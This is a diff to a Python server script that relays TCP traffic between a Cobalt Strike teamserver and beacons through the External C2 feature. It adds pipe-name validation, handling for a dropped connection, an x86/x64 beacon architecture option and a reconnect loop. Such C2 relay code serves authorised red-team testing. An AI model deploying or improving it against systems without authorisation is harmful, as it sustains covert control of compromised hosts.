@@ -1,9 +1,8 @@
 """
     server.py
     by Daniel Fitzgerald
-    Jan 2020
 
-    Program to provide TCP communications for Cobalt Strike using the External C2 feature.
+    Program to provide basic TCP communications for Cobalt Strike using the External C2 feature.
 """
 import argparse
 import base64
@@ -27,6 +26,8 @@ class TCPinfo:
         :param srv_port: Port of server to listen on
         :param pipe_str: String for named pipe on client
         """
+        if len(pipe_str) > 50:
+            raise ValueError('pipe_str must be less than 50 characters')
         self.ts_ip = ts_ip
         self.ts_port = ts_port
         self.srv_ip = srv_ip
@@ -106,9 +107,12 @@ class ExternalC2Controller:
         """
         data = bytearray()
         _len = self._socketTS.recv(4)
-        l = struct.unpack("<I", _len)[0]
-        while len(data) < l:
-            data += self._socketTS.recv(l - len(data))
+        if len(_len) == 0:
+            print('connection to ts died. Exiting')
+            exit(2)
+        frame_length = struct.unpack("<I", _len)[0]
+        while len(data) < frame_length:
+            data += self._socketTS.recv(frame_length - len(data))
         return data
 
     def sendToBeacon(self, tcpinfo, data):
@@ -136,7 +140,7 @@ class ExternalC2Controller:
         return data
 
 
-    def run(self, tcpinfo):
+    def run(self, tcpinfo, arch):
         """
 
         :param tcpinfo: Class with user TCP info
@@ -150,7 +154,7 @@ class ExternalC2Controller:
             return
         
         # Send out config options
-        self.send_to_ts("arch=x86".encode())
+        self.send_to_ts("arch={}".format(arch).encode())
         self.send_to_ts("pipename={}".format(tcpinfo.pipe_str).encode())
         self.send_to_ts("block=500".encode())
         self.send_to_ts("go".encode())
@@ -195,8 +199,11 @@ parser.add_argument('srv_ip', help="IP to bind to on server.")
 parser.add_argument('srv_port', type=int, help="Port number to bind to on server.")
 parser.add_argument('pipe_str', help="String to name the pipe to the beacon. It must be the same as the client.")
 parser.add_argument('--teamserver_port', '-tp', default=2222, type=int, help="Customize the port used to connect to the teamserver. Default is 2222.")
+parser.add_argument('--arch', '-a', choices=['x86', 'x64'], default='x86', type=str, help="Architecture to use for beacon. x86 or x64. Default is x86.")
 args = parser.parse_args()
 controller = ExternalC2Controller(args.teamserver_port)
 tcpinfo = TCPinfo(args.ts_ip, args.teamserver_port, args.srv_ip, args.srv_port, args.pipe_str)
 while True:
-    controller.run(tcpinfo)
+    controller.run(tcpinfo, args.arch)
+    print('waiting 1s before reconnecting to TS')
+    time.sleep(1)
